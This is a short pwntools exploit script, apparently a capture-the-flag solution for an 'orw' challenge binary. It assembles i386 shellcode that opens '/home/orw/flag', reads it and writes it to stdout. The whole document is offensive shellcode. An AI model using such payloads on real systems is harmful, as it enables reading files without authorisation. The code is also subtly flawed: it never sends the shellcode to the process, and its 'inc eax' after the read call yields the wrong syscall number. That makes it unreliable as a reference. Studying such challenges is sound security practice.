from pwn import *

p = process('./orw')

context(os = 'linux',arch='i386',log_level='debug')

shellcode = ''
shellcode += asm('''
push 0x67616c66
push 0x2f77726f
push 0x2f656d6f
push 0x682f2f2f
mov eax, 5
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80
mov eax, 3
mov ebx, 3
mov ecx, esp
mov edx, 0x20
int 0x80
inc eax
mov ebx, 1
int 0x80
''')

print(shellcode)